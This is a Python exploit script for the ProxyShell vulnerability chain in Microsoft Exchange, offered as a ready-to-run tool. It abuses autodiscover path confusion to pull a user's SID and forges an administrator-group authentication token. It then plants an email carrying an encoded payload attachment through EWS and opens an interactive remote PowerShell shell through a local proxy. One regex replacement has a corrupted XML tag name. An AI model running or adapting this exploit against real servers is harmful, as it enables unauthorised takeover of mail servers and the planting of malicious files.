import requests
import argparse
import sys
import struct
import base64
import string
import random
import re
import threading
import xml.etree.ElementTree as ET
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
from encode_payload import generate_payload


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


class ExchangePowershellHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # credits: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        post_data = re.sub('<wsa:To>(.*?)</wsa:To>',
                           '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>',
                           '<wsman:ResourceUśI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)

        headers = {
            'Content-Type': content_type
        }

        powershell_endpoint = exchange_url + \
            f"/autodiscover/autodiscover.json?@test.com/powershell/?X-Rps-CAT={token}&Email=autodiscover/autodiscover.json%3F@test.com"
        resp = requests.post(powershell_endpoint,
                             data=post_data, headers=headers, verify=False)
        content = resp.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(content)


def check_proxyshell_on_exchange(url: str):
    print("[-] Checking for Proxyshell vulnerability on Exchange Server")
    endpoint_url = url + \
        f"/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.get(endpoint_url, verify=False, allow_redirects=False)
    if resp.status_code == 302:
        print("[+] Exchange Server is vulnerable to Proxyshell")
        return True

    print("[x] Exchange Server is not vulnerable to Proxyshell")
    return False


def gen_token(email: str, sid: str):
    # Credits: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    print("[-] Generating token")
    version = 0
    ttype = 'Windows'
    compressed = 0
    auth_type = 'Kerberos'
    raw_token = b''
    gsid = 'S-1-5-32-544'

    version_data = b'V' + (1).to_bytes(1, 'little') + \
        (version).to_bytes(1, 'little')
    type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
    compress_data = b'C' + (compressed).to_bytes(1, 'little')
    auth_data = b'A' + (len(auth_type)).to_bytes(1,
                                                 'little') + auth_type.encode()
    login_data = b'L' + (len(email)).to_bytes(1, 'little') + email.encode()
    user_data = b'U' + (len(sid)).to_bytes(1, 'little') + sid.encode()
    group_data = b'G' + struct.pack('<II', 1, 7) + \
        (len(gsid)).to_bytes(1, 'little') + gsid.encode()
    ext_data = b'E' + struct.pack('>I', 0)

    raw_token += version_data
    raw_token += type_data
    raw_token += compress_data
    raw_token += auth_data
    raw_token += login_data
    raw_token += user_data
    raw_token += group_data
    raw_token += ext_data

    data = base64.b64encode(raw_token).decode()

    print(f"[+] Token generated: {data}")
    return data


def check_token_valid(url: str, token: str):
    print("[-] Checking if token is valid or not")
    powershell_endpoint = url + \
        f"/autodiscover/autodiscover.json?@test.com/powershell/?X-Rps-CAT={token}&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.get(powershell_endpoint, verify=False)
    if resp.status_code == 200:
        print("[+] Token is valid")
        return
    print("[x] Token is not valid, need more debugging")
    sys.exit(1)


def get_sid(url: str, email: str):

    print("[-] Getting LegacyDN")
    body = f"""
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{email}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>
    """

    autodiscover_url = url + f"/autodiscover/autodiscover.json?@test.com/autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.post(autodiscover_url, headers={
        "Content-Type": "text/xml"
    }, data=body.encode("utf-8"), verify=False)
    autodiscover_xml = ET.fromstring(resp.text)
    legacydn = autodiscover_xml.find('{*}Response/{*}User/{*}LegacyDN').text
    print("[+] Successfully get LegacyDN")
    data = legacydn
    data += '\x00\x00\x00\x00\x00\xe4\x04'
    data += '\x00\x00\x09\x04\x00\x00\x09'
    data += '\x04\x00\x00\x00\x00\x00\x00'

    headers = {
        "X-Requesttype": 'Connect',
        "X-Clientapplication": 'Outlook/15.1.2176.9',
        "X-Requestid": 'anything',
        'Content-Type': 'application/mapi-http'
    }
    print("[-] Getting User SID")
    sid_endpoint = url + f"/autodiscover/autodiscover.json?@test.com/mapi/emsmdb?&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.post(sid_endpoint, data=data,
                         headers=headers, verify=False)
    sid = resp.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
    print("[+] Successfully get User SID")
    return sid

def rand_subject(n=6):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def send_email_contains_malicious_payload():
    encoded_payload = generate_payload()
    subject_id = rand_subject(16)
    print (f"[-] Sending email contains payload with subject id: {subject_id}")
    email_body = f"""
    <soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:SerializedSecurityContext>
      <t:UserSid>{sid}</t:UserSid>
      <t:GroupSids>
        <t:GroupIdentifier>
          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
        </t:GroupIdentifier>
      </t:GroupSids>
    </t:SerializedSecurityContext>
  </soap:Header>
  <soap:Body>
    <m:CreateItem MessageDisposition="SaveOnly">
      <m:Items>
        <t:Message>
          <t:Subject>{subject_id}</t:Subject>
          <t:Body BodyType="HTML">hello from darkness side</t:Body>
          <t:Attachments>
            <t:FileAttachment>
              <t:Name>FileAttachment.txt</t:Name>
              <t:IsInline>false</t:IsInline>
              <t:IsContactPhoto>false</t:IsContactPhoto>
              <t:Content>{encoded_payload}</t:Content>
            </t:FileAttachment>
          </t:Attachments>
          <t:ToRecipients>
            <t:Mailbox>
              <t:EmailAddress>{email}</t:EmailAddress>
            </t:Mailbox>
          </t:ToRecipients>
        </t:Message>
      </m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>
    """
    headers = {
        "Content-Type": "text/xml",
        # 'Cookie': f'Email=autodiscover/autodiscover.json?a=a@gmail.com'
    }
    ews_endpoint = exchange_url + f"/autodiscover/autodiscover.json?@test.com/EWS/exchange.asmx?X-Rps-CAT={token}&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.post(ews_endpoint, data=email_body, headers=headers, verify=False)
    if resp.status_code == 200:
        print (f"[+] Sent email successfully with subject id: {subject_id}")
    return subject_id

# ------------------------------------------------------------------------------


def start_server(url: str, token: str, port: int):
    server = ThreadedHTTPServer(('', port), ExchangePowershellHandler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()


def shell(command, port):
    # Credits: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    if command.lower() in ['exit', 'quit']:
        exit()

    wsman = WSMan("127.0.0.1", username='', password='', ssl=False,
                  port=port, auth='basic', encryption='never')
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        output = ps.invoke()

    print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
    print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

# ------------------------------------------------------------------------------


def main():
    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-u', help='Exchange URL', required=True)
    parser.add_argument('-e', help='Email address', required=True)
    parser.add_argument('-p', help='Local wsman port', default=8000, type=int)
    args = parser.parse_args()
    global exchange_url
    global token
    global sid
    global email
    exchange_url = args.u
    email = args.e
    local_port = args.p

    # Stage 1
    is_vulnerable = check_proxyshell_on_exchange(exchange_url)
    if not is_vulnerable:
        sys.exit(1)
    # Stage 2
    sid = get_sid(exchange_url, email)
    token = gen_token(email, sid)
    check_token_valid(exchange_url, token)
    # Stage 3
    send_email_contains_malicious_payload()

    # Proxy server
    start_server(port=local_port, url=exchange_url, token=token)

    while True:
        shell(input('PS> '), local_port)


if __name__ == '__main__':
    main()
